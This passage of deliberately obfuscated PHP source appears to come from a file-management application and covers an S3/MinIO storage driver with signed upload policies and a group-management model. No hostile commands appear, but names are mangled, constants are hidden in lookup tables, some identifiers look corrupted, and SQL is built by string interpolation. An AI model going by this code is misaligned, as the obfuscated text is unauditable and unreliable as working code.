$this->client->__getSignatureV4($ñÁà±Š‘, $ô­©™â, $¾·êŞèÏ, $ü‹ÚÂ¦, $¸¥¥Ò¨); return array($Ïƒ½«[288] => $•€æÍ÷, $Ïƒ½«[292] => $ñÁà±Š‘[$Ïƒ½«[292]], $Ïƒ½«[284] => $ñÁà±Š‘[$Ïƒ½«[275]], $Ïƒ½«[291] => $ÜÁš±Ä); } private function _isClientAsync() { $”™Ÿ´ =& $_SERVER[Š—Â“œÔ]; static $¹¢Œõ–› = null; if ($¹¢Œõ–› === null) { $Å³€Ş¿ = isset($_REQUEST[$”™Ÿ´[303]]) ? json_decode($_REQUEST[$”™Ÿ´[303]], !0) : !1; $¹¢Œõ–› = $Å³€Ş¿ && _get($Å³€Ş¿, $”™Ÿ´[304]) == $”™Ÿ´[305]; } return $¹¢Œõ–›; } public function getHost() { $ëÜÑ²´° =& $_SERVER[Š—Â“œÔ]; $İ¥ìÅãğ = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($ëÜÑ²´°[70], $ëÜÑ²´°[64], $ëÜÑ²´°[69], $ëÜÑ²´°[62]))) { return $İ¥ìÅãğ . $ëÜÑ²´°[8] . $this->bucket; } if ($this->osType == $ëÜÑ²´°[62] && !is_domain($İ¥ìÅãğ)) { return $İ¥ìÅãğ . $ëÜÑ²´°[8] . $this->bucket; } $İ¥ìÅãğ = explode($ëÜÑ²´°[210], $İ¥ìÅãğ); return $İ¥ìÅãğ[0] . $ëÜÑ²´°[210] . $this->bucket . $ëÜÑ²´°[10] . $İ¥ìÅãğ[1]; } public function size($¼õ·µµÃ) { $šÒ•“êÇ = $this->objectMeta($¼õ·µµÃ); return $šÒ•“êÇ ? $šÒ•“êÇ[$_SERVER[Š—Â“œÔ][79]] : 0; } public function info($ŸÇÅ×Ğ€) { if ($this->isFolder($ŸÇÅ×Ğ€)) { return $this->folderInfo($ŸÇÅ×Ğ€); } else { if ($this->isFile($ŸÇÅ×Ğ€)) { return $this->fileInfo($ŸÇÅ×Ğ€); } } return !1; } public function exist($Õ†«°³È) { return $this->isFile($Õ†«°³È) || $this->isFolder($Õ†«°³È); } public function isFile($ÕşÎÒ¶á) { return !$this->isFolder($ÕşÎÒ¶á) && $this->objectMeta($ÕşÎÒ¶á); } public function isFolder($©¯ÛÀ¤ƒ) { return $this->cacheMethod($_SERVER[Š—Â“œÔ][179], $©¯ÛÀ¤ƒ); } protected function objectMeta($§Ë¢—–·) { return $this->cacheMethod($_SERVER[Š—Â“œÔ][181], $§Ë¢—–·); } protected function _objectMeta($ıë™Ï») { $¢šâôçË =& $_SERVER[Š—Â“œÔ]; $ıë™Ï» = rtrim($ıë™Ï», $¢šâôçË[8]); try { $™–¬¼ø° = $this->client->getObjectInfo($this->bucket, $ıë™Ï»); if (!isset($™–¬¼ø°[$¢šâôçË[254]]) && isset($™–¬¼ø°[$¢šâôçË[306]])) { $™–¬¼ø°[$¢šâôçË[254]] = $™–¬¼ø°[$¢šâôçË[306]]; } } catch (Exception $·³¼Øı) { $™–¬¼ø° = !1; } if (!$™–¬¼ø°) { } return $™–¬¼ø°; } protected function _isFolder($İ•³òªò) { $Ò°–ÔÂ‹ =& $_SERVER[Š—Â“œÔ]; $İ•³òªò = rtrim($İ•³òªò, $Ò°–ÔÂ‹[8]) . $Ò°–ÔÂ‹[8]; if ($İ•³òªò == $Ò°–ÔÂ‹[12] || $İ•³òªò == $Ò°–ÔÂ‹[8]) { return !0; } $’Ä©ã’× = $this->client->getBucket($this->bucket, $İ•³òªò, null, 1); if (empty($’Ä©ã’×[$Ò°–ÔÂ‹[238]])) { return !1; } $ùÅ—úèõ = $’Ä©ã’×[$Ò°–ÔÂ‹[238]][0][$Ò°–ÔÂ‹[32]]; return stripos($ùÅ—úèõ, $İ•³òªò) === 0 ? !0 : !1; if (substr($ùÅ—úèõ, -1) == $Ò°–ÔÂ‹[8]) { return !0; } if (get_path_this($ùÅ—úèõ) == get_path_this($İ•³òªò)) { return !1; } return !0; } public function listObject($ãşÛ¯“Ô) { return $this->fileList($ãşÛ¯“Ô, $_SERVER[Š—Â“œÔ][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($òÙô…ß) { $Û³„ŞÒç =& $_SERVER[Š—Â“œÔ]; parent::__construct($òÙô…ß); $this->setSignVersion($Û³„ŞÒç[249]); if (!$this->region) { $this->region = $Û³„ŞÒç[307]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $â½ì¼’ = $this->getBktRegion(); return $this->region == $â½ì¼’ ? !0 : !1; } public function uploadFormData($³êšöÓó, $‚îÔ÷üñ = 3600) { $›®‹€úÕ =& $_SERVER[Š—Â“œÔ]; $ó›¤«Ê½ = $›®‹€úÕ[231]; $õšŒÜÜ™ = $›®‹€úÕ[259]; $ÁÙ§€ŞÏ = $›®‹€úÕ[62]; $Ç¡‡äß‰ = gmdate($›®‹€úÕ[260]); $Ìµ¹–” = gmdate($›®‹€úÕ[261]); $ñŞÃØ‰ = $›®‹€úÕ[262]; $òÉÛ¼ù´ = $‚îÔ÷üñ . $›®‹€úÕ[12]; $•Ğó‡Ô = $›®‹€úÕ[263]; $øí¶ÒğÚ = array($this->accessKey, $Ìµ¹–”, $this->region, $ÁÙ§€ŞÏ, $ñŞÃØ‰); $‘Í¦ ’ç = implode($›®‹€úÕ[8], $øí¶ÒğÚ); $¦å–ğïì = array($›®‹€úÕ[264] => gmdate($›®‹€úÕ[265], strtotime($›®‹€úÕ[266])), $›®‹€úÕ[267] => array(array($›®‹€úÕ[268] => $this->bucket), array($›®‹€úÕ[308] => $ó›¤«Ê½), array($›®‹€úÕ[269], $›®‹€úÕ[270], $›®‹€úÕ[12]), array($›®‹€úÕ[269], $›®‹€úÕ[271], $›®‹€úÕ[12]), array($›®‹€úÕ[269], $›®‹€úÕ[309], $›®‹€úÕ[12]), array($›®‹€úÕ[272] => $•Ğó‡Ô), array($›®‹€úÕ[273] => $‘Í¦ ’ç), array($›®‹€úÕ[274] => $õšŒÜÜ™), array($›®‹€úÕ[275] => $Ç¡‡äß‰), array($›®‹€úÕ[276] => $òÉÛ¼ù´))); $–¥ïÏÄµ = base64_encode(json_encode($¦å–ğïì)); $Å„ò°€Ê = hash_hmac($›®‹€úÕ[277], $Ìµ¹–”, $›®‹€úÕ[278] . $this->secret, !0); $‘õÅÕ‚è = hash_hmac($›®‹€úÕ[277], $this->region, $Å„ò°€Ê, !0); $ñê»†˜Ã = hash_hmac($›®‹€úÕ[277], $ÁÙ§€ŞÏ, $‘õÅÕ‚è, !0); $†¯Àû“£ = hash_hmac($›®‹€úÕ[277], $ñŞÃØ‰, $ñê»†˜Ã, !0); $Ç±ĞÖ†Ê = hash_hmac($›®‹€úÕ[277], $–¥ïÏÄµ, $†¯Àû“£); $¸ÕŒå‡ø = array($›®‹€úÕ[248] => $›®‹€úÕ[12], $›®‹€úÕ[296] => $›®‹€úÕ[12], $›®‹€úÕ[308] => $ó›¤«Ê½, $›®‹€úÕ[272] => $•Ğó‡Ô, $›®‹€úÕ[279] => $–¥ïÏÄµ, $›®‹€úÕ[310] => $‘Í¦ ’ç, $›®‹€úÕ[311] => $õšŒÜÜ™, $›®‹€úÕ[312] => $Ç¡‡äß‰, $›®‹€úÕ[313] => $òÉÛ¼ù´, $›®‹€úÕ[314] => $Ç±ĞÖ†Ê, $›®‹€úÕ[208] => $this->getHost()); return $¸ÕŒå‡ø; } } goto EÔÓ³Çˆ•µ; D¡åçÔù”­: class GroupModel extends ModelBase { protected $tableName = "\147\x72\x6f\x75\160"; protected $tableMeta = array("\164\x61\142\x6c\x65\x4e\x61\x6d\x65" => "\147\162\x6f\165\160\137\155\x65\164\141", "\155\145\x74\141\x46\151\x65\x6c\144" => "\x67\x72\157\x75\160\111\x44"); protected function cacheFunctionAlias($¢¹×ÑÚ¶) { $«Úë£„ =& $_SERVER[Š—Â“œÔ]; return array($«Úë£„[2053] => array($¢¹×ÑÚ¶[0], $«Úë£„[2054]), $«Úë£„[2055] => array($¢¹×ÑÚ¶[0], $«Úë£„[2056])); } protected function getInfo($‹ÔŒßôç, $«ƒãõŠ¡ = false) { $ª›â‡“º = $this->getInfoSimple($‹ÔŒßôç); if (!$ª›â‡“º) { return !1; } if ($«ƒãõŠ¡) { return $this->_listDataApplyItem($ª›â‡“º); } return $this->cacheFunctionGet($_SERVER[Š—Â“œÔ][2057], $‹ÔŒßôç); } protected function getInfoSimple($£¯„¿‘, $§æŠì¸Ù = false) { $éÌ†§° =& $_SERVER[Š—Â“œÔ]; if ($§æŠì¸Ù) { $€öªœªÃ = array($éÌ†§°[1971] => intval($£¯„¿‘)); $²À©‚¯› = $this->where($€öªœªÃ)->find(); return is_array($²À©‚¯›) ? $²À©‚¯› : array(); } return $this->cacheFunctionGet($éÌ†§°[2058], $£¯„¿‘); } protected function groupAdd($ÖóŸ“½Ø) { $ÑµíÙÔ“ =& $_SERVER[Š—Â“œÔ]; if (!$ÖóŸ“½Ø[$ÑµíÙÔ“[192]] && isset($ÖóŸ“½Ø[$ÑµíÙÔ“[1971]]) && $ÖóŸ“½Ø[$ÑµíÙÔ“[1971]] == 1) { if ($Îìá¨Ø« = $this->getInfoSimple($ÖóŸ“½Ø[$ÑµíÙÔ“[1971]], !0)) { return $ÖóŸ“½Ø[$ÑµíÙÔ“[1971]]; } } else { $Îìá¨Ø« = $this->getInfoSimple($ÖóŸ“½Ø[$ÑµíÙÔ“[192]]); if (!$Îìá¨Ø«) { return !1; } } $èä”Îç = $ÑµíÙÔ“[595]; if ($Îìá¨Ø«[$ÑµíÙÔ“[586]]) { $èä”Îç = $Îìá¨Ø«[$ÑµíÙÔ“[586]] . $Îìá¨Ø«[$ÑµíÙÔ“[1971]] . $ÑµíÙÔ“[50]; } $Ôó´€–Ä = array($ÑµíÙÔ“[496] => $this->groupNameAuto($ÖóŸ“½Ø[$ÑµíÙÔ“[192]], $ÖóŸ“½Ø[$ÑµíÙÔ“[32]]), $ÑµíÙÔ“[479] => $ÖóŸ“½Ø[$ÑµíÙÔ“[192]], $ÑµíÙÔ“[657] => $èä”Îç, $ÑµíÙÔ“[2059] => $ÖóŸ“½Ø[$ÑµíÙÔ“[1957]], $ÑµíÙÔ“[2060] => 0, $ÑµíÙÔ“[1975] => 0); if (isset($ÖóŸ“½Ø[$ÑµíÙÔ“[1995]])) { $Ôó´€–Ä[$ÑµíÙÔ“[1995]] = $ÖóŸ“½Ø[$ÑµíÙÔ“[1995]]; } else { $şÆÄ¥ĞÇ = $this->max($ÑµíÙÔ“[1995]); if (!$şÆÄ¥ĞÇ) { $şÆÄ¥ĞÇ = 0; } $Ôó´€–Ä[$ÑµíÙÔ“[1995]] = $şÆÄ¥ĞÇ + 1; } if (!empty($ÖóŸ“½Ø[$ÑµíÙÔ“[1971]])) { $Ôó´€–Ä[$ÑµíÙÔ“[1971]] = $ÖóŸ“½Ø[$ÑµíÙÔ“[1971]]; } $ù†–‰×ß = $this->add($Ôó´€–Ä); $this->setNamePinyin($ù†–‰×ß, $Ôó´€–Ä[$ÑµíÙÔ“[32]]); if (isset($ÖóŸ“½Ø[$ÑµíÙÔ“[2061]])) { $this->metaSet($ù†–‰×ß, array($ÑµíÙÔ“[2061] => $ÖóŸ“½Ø[$ÑµíÙÔ“[2061]], $ÑµíÙÔ“[2062] => $ÖóŸ“½Ø[$ÑµíÙÔ“[2062]])); unset($ÖóŸ“½Ø[$ÑµíÙÔ“[2061]]); unset($ÖóŸ“½Ø[$ÑµíÙÔ“[2062]]); } Model($ÑµíÙÔ“[1419])->groupRootAdd($ù†–‰×ß); $this->_clearCache($ÖóŸ“½Ø[$ÑµíÙÔ“[192]]); return $ù†–‰×ß; } protected function groupEdit($ûı­ËÕ, $‡Ã—Ğ­) { $êÂû¶ïå =& $_SERVER[Š—Â“œÔ]; $Œ¡ã¼„ƒ = $this->getInfoSimple($ûı­ËÕ); if (!$Œ¡ã¼„ƒ) { return !1; } if (!empty($‡Ã—Ğ­[$êÂû¶ïå[192]])) { $¡ƒ­÷Š = $this->getInfoSimple($‡Ã—Ğ­[$êÂû¶ïå[192]]); if (!$¡ƒ­÷Š) { return !1; } if ($Œ¡ã¼„ƒ[$êÂû¶ïå[1971]] == $¡ƒ­÷Š[$êÂû¶ïå[1971]]) { return !1; } if ($‡Ã—Ğ­[$êÂû¶ïå[192]] != $Œ¡ã¼„ƒ[$êÂû¶ïå[192]]) { if ($¡ƒ­÷Š[$êÂû¶ïå[586]] !== $Œ¡ã¼„ƒ[$êÂû¶ïå[586]] && strpos($¡ƒ­÷Š[$êÂû¶ïå[586]], $Œ¡ã¼„ƒ[$êÂû¶ïå[586]] . $Œ¡ã¼„ƒ[$êÂû¶ïå[1971]] . $êÂû¶ïå[50]) === 0) { return !1; } $‡Ã—Ğ­[$êÂû¶ïå[657]] = $¡ƒ­÷Š[$êÂû¶ïå[586]] . $‡Ã—Ğ­[$êÂû¶ïå[192]] . $êÂû¶ïå[50]; $this->_changeChildLevel($Œ¡ã¼„ƒ, $¡ƒ­÷Š); $this->_clearCache($¡ƒ­÷Š[$êÂû¶ïå[1971]]); $this->_clearCache($Œ¡ã¼„ƒ[$êÂû¶ïå[192]]); } } if (isset($‡Ã—Ğ­[$êÂû¶ïå[32]])) { $this->setNamePinyin($ûı­ËÕ, $‡Ã—Ğ­[$êÂû¶ïå[32]]); } if (isset($‡Ã—Ğ­[$êÂû¶ïå[2061]])) { $this->metaSet($ûı­ËÕ, array($êÂû¶ïå[2061] => $‡Ã—Ğ­[$êÂû¶ïå[2061]], $êÂû¶ïå[2062] => $‡Ã—Ğ­[$êÂû¶ïå[2062]])); unset($‡Ã—Ğ­[$êÂû¶ïå[2061]]); unset($‡Ã—Ğ­[$êÂû¶ïå[2062]]); } $this->_clearChildrenCache($Œ¡ã¼„ƒ); return $this->where(array($êÂû¶ïå[2063] => $ûı­ËÕ))->save($‡Ã—Ğ­); } private function _clearChildrenCache($» çÛ) { $„ˆ–½§È =& $_SERVER[Š—Â“œÔ]; $®ë–ê‚° = array($„ˆ–½§È[657] => array($„ˆ–½§È[617], $» çÛ[$„ˆ–½§È[586]] . $» çÛ[$„ˆ–½§È[1971]] . $„ˆ–½§È[618])); $²¯æÀÅ = $this->field($„ˆ–½§È[1971])->where($®ë–ê‚°)->select(); foreach ($²¯æÀÅ as $ı¿Ÿşˆñ) { $this->_clearCache($ı¿Ÿşˆñ[$„ˆ–½§È[1971]]); } } private function _clearCache($ãıÏ›Õç) { $šË²…‡ =& $_SERVER[Š—Â“œÔ]; $this->cacheFunctionClear($šË²…‡[2057], $ãıÏ›Õç); $this->cacheFunctionClear($šË²…‡[2058], $ãıÏ›Õç); } private function _changeChildLevel($æ•Ë¯ë¶, $ÅƒÉ®àÓ, $ƒ®Ş÷ºÑ = false) { $ÏŸÖ‚¿Ó =& $_SERVER[Š—Â“œÔ]; $±ÀĞ–ÇÄ = $æ•Ë¯ë¶[$ÏŸÖ‚¿Ó[586]] . $æ•Ë¯ë¶[$ÏŸÖ‚¿Ó[1971]] . $ÏŸÖ‚¿Ó[50]; $–×„Şİ = $ÅƒÉ®àÓ[$ÏŸÖ‚¿Ó[586]] . $ÅƒÉ®àÓ[$ÏŸÖ‚¿Ó[1971]] . $ÏŸÖ‚¿Ó[50] . $æ•Ë¯ë¶[$ÏŸÖ‚¿Ó[1971]] . $ÏŸÖ‚¿Ó[50]; if ($ƒ®Ş÷ºÑ) { $–×„Şİ = $ÅƒÉ®àÓ[$ÏŸÖ‚¿Ó[586]] . $ÅƒÉ®àÓ[$ÏŸÖ‚¿Ó[1971]] . $ÏŸÖ‚¿Ó[50]; } $şÌØğù = array($ÏŸÖ‚¿Ó[657] => array($ÏŸÖ‚¿Ó[617], $æ•Ë¯ë¶[$ÏŸÖ‚¿Ó[586]] . $æ•Ë¯ë¶[$ÏŸÖ‚¿Ó[1971]] . $ÏŸÖ‚¿Ó[618])); $îîş¿³ì = array($ÏŸÖ‚¿Ó[657] => array($ÏŸÖ‚¿Ó[666], "\x72\x65\160\x6c\141\143\145\x28\x70\x61\162\145\156\164\x4c\x65\166\x65\x6c\54\x27{$±ÀĞ–ÇÄ}\47\x2c\47{$–×„Şİ}\47\51")); $this->_clearChildrenCache($æ•Ë¯ë¶); $this->where($şÌØğù)->data($îîş¿³ì)->save(); } public function setNamePinyin($›ÁÁ¨Â½, $áÙ´×© = false) { $šü€ÑØ =& $_SERVER[Š—Â“œÔ]; if (!$áÙ´×©) { $«íß¥® = $this->getInfoSimple($›ÁÁ¨Â½); $áÙ´×© = $«íß¥®[$šü€ÑØ[32]]; } if (!Input::check($áÙ´×©, $šü€ÑØ[660])) { $this->metaSet($›ÁÁ¨Â½, $šü€ÑØ[540], null); $this->metaSet($›ÁÁ¨Â½, $šü€ÑØ[539], null); return; } $®ØØ¡–  = array($šü€ÑØ[540] => str_replace($šü€ÑØ[53], $šü€ÑØ[12], Pinyin::get($áÙ´×©)), $šü€ÑØ[539] => Pinyin::get($áÙ´×©, $šü€ÑØ[661])); $this->metaSet($›ÁÁ¨Â½, $®ØØ¡– ); } protected function metaSet($Ä——¯¼Î, $œ¡ôô‹± = null, $†ÚŸ”º· = null) { $this->_clearCache($Ä——¯¼Î); return parent::metaSet($Ä——¯¼Î, $œ¡ôô‹±, $†ÚŸ”º·); } protected function groupStatus($›ĞÏ¬¤œ, $€ûÊ‡Ì«) { $–ÓÑØÕá =& $_SERVER[Š—Â“œÔ]; $ŒÏïÊ¦¥ = $this->getInfoSimple($›ĞÏ¬¤œ); if (!$ŒÏïÊ¦¥) { return !1; } $this->_clearCache($›ĞÏ¬¤œ); return $this->metaSet($›ĞÏ¬¤œ, $–ÓÑØÕá[817], $€ûÊ‡Ì«); if ($€ûÊ‡Ì« == $–ÓÑØÕá[91]) { $ø€¾É¢ß = $this->parentLevelArray($ŒÏïÊ¦¥[$–ÓÑØÕá[586]]); } else { } $ø€¾É¢ß[] = $ŒÏïÊ¦¥[$–ÓÑØÕá[1971]]; $Ù‰¦¿¸Ô = array(); foreach ($ø€¾É¢ß as $›ĞÏ¬¤œ) { $Ù‰¦¿¸Ô[] = array($–ÓÑØÕá[1971] => $›ĞÏ¬¤œ, $–ÓÑØÕá[97] => $–ÓÑØÕá[817], $–ÓÑØÕá[452] => $€ûÊ‡Ì«); $this->_clearCache($›ĞÏ¬¤œ); } return Model($–ÓÑØÕá[2064])->addAll($Ù‰¦¿¸Ô, array(), !0); } protected function groupRemove($èÖáÍİ, $ŸŞ«Ä¶Ÿ = false) { $™Ö¦åøş =& $_SERVER[Š—Â“œÔ]; $é¢é”äÀ = array($™Ö¦åøş[1971] => $èÖáÍİ); $øê´¡µó = $this->where($é¢é”äÀ)->find(); if (!$øê´¡µó || $øê´¡µó[$™Ö¦åøş[192]] == 0) { return !1; } if (!$ŸŞ«Ä¶Ÿ) { $£ÛƒË§† = $this->getInfoSimple($øê´¡µó[$™Ö¦åøş[192]]); $this->_changeChildLevel($øê´¡µó, $£ÛƒË§†, !0); $this->where(array($™Ö¦åøş[192] => $èÖáÍİ))->save(array($™Ö¦åøş[192] => $øê´¡µó[$™Ö¦åøş[192]])); $this->_clearCache($£ÛƒË§†[$™Ö¦åøş[1971]]); } Model($™Ö¦åøş[2064])->where($é¢é”äÀ)->delete(); Model($™Ö¦åøş[2065])->where($é¢é”äÀ)->delete(); Model($™Ö¦åøş[892])->groupRootRemove($èÖáÍİ); $this->_clearCache($øê´¡µó[$™Ö¦åøş[192]]); return $this->where($é¢é”äÀ)->delete(); } protected function groupSort($Ü¿¡ÆÖá) { $¤Ø‡øÈ =& $_SERVER[Š—Â“œÔ]; $ñ¦®º‹è = array(); foreach ($Ü¿¡ÆÖá as $‡ç±Ò¯¬ => $©”ÙµÍ¾) { $ñ¦®º‹è[] = array($¤Ø‡øÈ[1971], $©”ÙµÍ¾, $¤Ø‡øÈ[1995], $‡ç±Ò¯¬ + 1); } $this->saveAll($ñ¦®º‹è); } public function listData() { $·«Í²ÉŸ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($·«Í²ÉŸ[$_SERVER[Š—Â“œÔ][447]]); return $·«Í²ÉŸ; } private function _makeOrder($áäÎ¬Àœ = '') { $£—û££€ =& $_SERVER[Š—Â“œÔ]; $¬Ñ¤Ë³ş = array($£—û££€[1971], $£—û££€[32], $£—û££€[1959], $£—û££€[233]); $ÕÂ»àÏ• = array($£—û££€[525] => $£—û££€[526], $£—û££€[527] => $£—û££€[528]); $äãŒ½˜Û = Input::get($£—û££€[532], $£—û££€[7], $£—û££€[1975], $¬Ñ¤Ë³ş); $Şôà»Âä = Input::get($£—û££€[533], $£—û££€[7], $£—û££€[2066], array($£—û££€[2066], $£—û££€[527])); $Şôà»Âä = $ÕÂ»àÏ•[$Şôà»Âä]; $áäÎ¬Àœ = $áäÎ¬Àœ . "{$äãŒ½˜Û}\x20{$Şôà»Âä}\54\40\147\x72\157\165\x70\x49\104\40\x61\x73\143"; return $this->order($áäÎ¬Àœ); } public function listChild($£å¨ÍØ”) { $Ë ÆåŠ¶ =& $_SERVER[Š—Â“œÔ]; $²³­«Ó = $this->where(array($Ë ÆåŠ¶[192] => $£å¨ÍØ”))->_makeOrder()->selectPage(200); $this->_listDataApply($²³­«Ó[$Ë ÆåŠ¶[447]]); return $²³­«Ó; } public function listChildIds($Øïçåà´) { $¹İ—ìõö =& $_SERVER[Š—Â“œÔ]; if (is_string($ã•ˆœœù)) { $Øïçåà´ = explode($¹İ—ìõö[50], $Øïçåà´); } $åÃí¯ù¤ = $this->where(array($¹İ—ìõö[1971] => array($¹İ—ìõö[7], $Øïçåà´)))->field($¹İ—ìõö[2067])->select(); if (!$åÃí¯ù¤) { return !1; } $íİ½„ô” = array(); foreach ($åÃí¯ù¤ as $ Ú¤”„ã) { $íİ½„ô”[] = "\163\145\154\145\143\x74\40\x67\x72\x6f\165\160\x49\x44\40\x66\x72\157\x6d\x20\x60\147\162\157\x75\x70\140\x20\167\x68\x65\x72\x65\40\160\141\162\145\156\164\114\x65\x76\x65\154\40\x6c\151\153\145\x20\47{$ Ú¤”„ã[$¹İ—ìõö[586]]}{$ Ú¤”„ã[$¹İ—ìõö[1971]]}\x2c\x25\47"; } $íİ½„ô” = implode($¹İ—ìõö[2068], $íİ½„ô”); $åÃí¯ù¤ = $this->query($íİ½„ô”); if (!$åÃí¯ù¤) { return array(); } $Øïçåà´ = array_to_keyvalue($åÃí¯ù¤, $¹İ—ìõö[12], $¹İ—ìõö[1971]); return array_unique($Øïçåà´); } public function listByID($‡„‚‰šÌ) { $òÇ‚¸ŞØ =& $_SERVER[Š—Â“œÔ]; if (!$‡„‚‰šÌ) { return array(); } $÷€Ò«© = array($òÇ‚¸ŞØ[1971] => array($òÇ‚¸ŞØ[7], $‡„‚‰šÌ)); $õ ø‚¡½ = $this->where($÷€Ò«©)->select(); $õ ø‚¡½ = array_sort_keep($õ ø‚¡½, $òÇ‚¸ŞØ[1971], $‡„‚‰šÌ); $this->_listDataApply($õ ø‚¡½); return $õ ø‚¡½; } public function listSearch($„»Ò‘­Ã) { $ÄÆ’è» =& $_SERVER[Š—Â“œÔ]; $£¤‰ÆàÂ = trim($„»Ò‘­Ã[$ÄÆ’è»[2069]]); $ìéÍ‚– = explode($ÄÆ’è»[53], $£¤‰ÆàÂ); if (!$£¤‰ÆàÂ || count($ìéÍ‚–) == 1) { return $this->listSearchNow($„»Ò‘­Ã); } $¢ë°¡ê¢ = array($ÄÆ’è»[447] => array()); foreach ($ìéÍ‚– as $ı¬ŠÍ) { if (!trim($ı¬ŠÍ)) { continue; } $„»Ò‘­Ã[$ÄÆ’è»[2069]] = $ı¬ŠÍ; $§¼èâÓ = $this->listSearchNow($„»Ò‘­Ã); $¢ë°¡ê¢[$ÄÆ’è»[447]] = array_merge($¢ë°¡ê¢[$ÄÆ’è»[447]], $§¼èâÓ[$ÄÆ’è»[447]]); } $¢ë°¡ê¢[$ÄÆ’è»[447]] = array_unique_by_key($¢ë°¡ê¢[$ÄÆ’è»[447]], $ÄÆ’è»[1971]); $¢ë°¡ê¢[$ÄÆ’è»[444]] = array($ÄÆ’è»[445] => count($¢ë°¡ê¢[$ÄÆ’è»[447]]), $ÄÆ’è»[441] => 20, $ÄÆ’è»[430] => 1, $ÄÆ’è»[446] => 1); return $¢ë°¡ê¢; } public function listSearchNow($ÄÑ©Öª“) { $Œ˜¢Îú =& $_SERVER[Š—Â“œÔ]; $¨ÍüûÚ— = trim($ÄÑ©Öª“[$Œ˜¢Îú[2069]]); $¥ÆÔŞÓ© = isset($ÄÑ©Öª“[$Œ˜¢Îú[2070]]) ? $ÄÑ©Öª“[$Œ˜¢Îú[2070]] : !1; if (!trim($¨ÍüûÚ—)) { return !1; } $¨ÍüûÚ— = str_replace($Œ˜¢Îú[2071], $Œ˜¢Îú[2072], $¨ÍüûÚ—); $˜éì™Şà = array($Œ˜¢Îú[1971] => array($Œ˜¢Îú[461], "{$¨ÍüûÚ—}\45"), $Œ˜¢Îú[32] => array($Œ˜¢Îú[461], "\x25{$¨ÍüûÚ—}\45"), $Œ˜¢Îú[1074] => $Œ˜¢Îú[2073]); if ($¥ÆÔŞÓ©) { $ÔØµàÈğ = $this->getInfoSimple($¥ÆÔŞÓ©); $¶Ùìò†› = $ÔØµàÈğ[$Œ˜¢Îú[586]] . $¥ÆÔŞÓ© . $Œ˜¢Îú[618]; $˜éì™Şà = array($˜éì™Şà, array($Œ˜¢Îú[586] => array($Œ˜¢Îú[461], $¶Ùìò†›))); } $˜éì™Şà = $this->parseWhereLike($˜éì™Şà); $³ÚÍ—ó = $this->_makeOrder()->where($˜éì™Şà)->selectPage(20); $³ÚÍ—ó = $³ÚÍ—ó ? $³ÚÍ—ó : array($Œ˜¢Îú[447] => array(), $Œ˜¢Îú[444] => array()); if (!$³ÚÍ—ó || count($³ÚÍ—ó[$Œ˜¢Îú[447]]) < 5 && Input::check($¨ÍüûÚ—, $Œ˜¢Îú[395])) { $äÜ¼ ²¹ = $this->groupChildrenAll($¥ÆÔŞÓ©); $±£Õêë = $this->_searchFromMeta($Œ˜¢Îú[539], $¨ÍüûÚ—, 10, $äÜ¼ ²¹); $“ğÏÇû° = $this->_searchFromMeta($Œ˜¢Îú[540], $¨ÍüûÚ—, 10, $äÜ¼ ²¹); $æÛÛ±•† = array_merge($±£Õêë, $“ğÏÇû°, $³ÚÍ—ó[$Œ˜¢Îú[447]]); $³ÚÍ—ó[$Œ˜¢Îú[447]] = array_unique_by_key($æÛÛ±•†, $Œ˜¢Îú[1971]); $³ÚÍ—ó[$Œ˜¢Îú[444]][$Œ˜¢Îú[445]] = count($³ÚÍ—ó[$Œ˜¢Îú[447]]); $³ÚÍ—ó[$Œ˜¢Îú[444]][$Œ˜¢Îú[446]] = ceil($³ÚÍ—ó[$Œ˜¢Îú[444]][$Œ˜¢Îú[445]] / $³ÚÍ—ó[$Œ˜¢Îú[444]][$Œ˜¢Îú[441]]); } $this->_listDataApply($³ÚÍ—ó[$Œ˜¢Îú[447]]); return $³ÚÍ—ó; } protected function groupChildrenAll($ãÈÈ˜) { $Ø­ß„†Ğ =& $_SERVER[Š—Â“œÔ]; if (!$ãÈÈ˜) { return !1; } if (!is_array($ãÈÈ˜)) { $ãÈÈ˜ = array($ãÈÈ˜); } $¿Ã« ØÎ = $ãÈÈ˜; foreach ($ãÈÈ˜ as $©á®ä‚²) { $äø´å‹ş = $this->getInfoSimple($©á®ä‚²); $€°åà·œ = array($Ø­ß„†Ğ[586] => array($Ø­ß„†Ğ[461], $äø´å‹ş[$Ø­ß„†Ğ[586]] . $©á®ä‚² . $Ø­ß„†Ğ[618])); $…’½­¿… = $this->field($Ø­ß„†Ğ[1971])->where($€°åà·œ)->select(); $¿Ã« ØÎ = array_merge($¿Ã« ØÎ, array_to_keyvalue($…’½­¿…, $Ø­ß„†Ğ[12], $Ø­ß„†Ğ[1971])); } return array_unique($¿Ã« ØÎ); } private function _searchFromMeta($¶Ùí“—, $ä¤¶â´¼, $À†—’²ë, $»ê°Ş„) { $¾£›¨Úı =& $_SERVER[Š—Â“œÔ]; $ä¤¶â´¼ = strtolower($ä¤¶â´¼); $Ë‰•‹« = array($¾£›¨Úı[97] => $¶Ùí“—, $¾£›¨Úı[452] => array($¾£›¨Úı[461], "\x25{$ä¤¶â´¼}\45")); $Ë‰•‹« = $this->parseWhereLike($Ë‰•‹«); if ($»ê°Ş„) { $Ë‰•‹«[$¾£›¨Úı[1971]] = array($¾£›¨Úı[7], $»ê°Ş„); } $Õò‘¶¤ = Model($¾£›¨Úı[2074])->where($Ë‰•‹«)->limit($À†—’²ë)->select(); if (!$Õò‘¶¤) { return array(); } $Õò‘¶¤ = array_to_keyvalue($Õò‘¶¤, $¾£›¨Úı[12], $¾£›¨Úı[1971]); $„ÊÁ»œØ = $this->where(array($¾£›¨Úı[2063] => array($¾£›¨Úı[7], $Õò‘¶¤)))->select(); if (!$„ÊÁ»œØ) { return array(); } return $„ÊÁ»œØ; } protected function _listDataApplyItem($¿ÓŞ¨Õ—) { $›ª¿¾û = array($¿ÓŞ¨Õ—); $this->_listDataApply($›ª¿¾û); return $›ª¿¾û[0]; } protected function _listDataApply(&$Òø‘¡éµ) { $õÔÌû› =& $_SERVER[Š—Â“œÔ]; if (!$Òø‘¡éµ) { return; } $Ø„îçÕò = array_to_keyvalue($Òø‘¡éµ, $õÔÌû›[12], $õÔÌû›[1971]); $this->_listAppendChildren($Òø‘¡éµ); $this->_listAppendChildrenMember($Òø‘¡éµ); 